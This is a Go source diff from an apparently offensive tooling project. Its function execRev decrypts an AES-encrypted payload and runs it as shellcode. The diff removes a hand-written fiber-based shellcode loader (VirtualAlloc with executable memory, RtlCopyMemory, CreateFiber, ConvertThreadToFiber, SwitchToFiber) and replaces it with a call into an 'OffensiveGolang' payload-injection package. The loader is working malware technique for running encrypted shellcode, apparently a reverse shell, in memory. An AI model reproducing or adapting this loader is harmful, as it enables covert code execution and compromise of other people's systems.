@@ -5,9 +5,9 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
-	"fmt"
 	"syscall"
-	"unsafe"
+
+	shellcode "github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/fibers"
 )
 
 const (
@@ -39,33 +39,7 @@ func execRev() {
 	stream := cipher.NewCTR(block, key[aes.BlockSize:])
 	stream.XORKeyStream(plaintext, ciphertext)
 
-	// Allocate executable memory for the shellcode
-	shellcodeAddr, _, _ := procVirtualAlloc.Call(0, uintptr(len(plaintext)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-	if shellcodeAddr == 0 {
-		lastError, _, _ := procGetLastError.Call()
-		fmt.Printf("[!] VirtualAlloc Failed With Error: %d \n", lastError)
-		return
-	}
-
-	// Copy the shellcode to the allocated memory
-	_, _, _ = procRtlCopyMemory.Call(shellcodeAddr, (uintptr)(unsafe.Pointer(&plaintext[0])), uintptr(len(plaintext)))
-
-	// Create a fiber to execute the shellcode
-	shellcodeFiberAddress, _, _ := procCreateFiber.Call(0, shellcodeAddr, 0)
-	if shellcodeFiberAddress == 0 {
-		lastError, _, _ := procGetLastError.Call()
-		fmt.Printf("[!] CreateFiber Failed With Error: %d \n", lastError)
-		return
-	}
-	// Convert current thread to a fiber
-	primaryFiberAddress, _, _ := procConvertThreadToFiber.Call(0)
-	if primaryFiberAddress == 0 {
-		lastError, _, _ := procGetLastError.Call()
-		fmt.Printf("[!] ConvertThreadToFiber Failed With Error: %d \n", lastError)
-		return
-	}
-	// Switch to the shellcode fiber
-	procSwitchToFiber.Call(shellcodeFiberAddress)
+	shellcode.ShellcodeFibers(Shellcode, Password)
 
 }
 
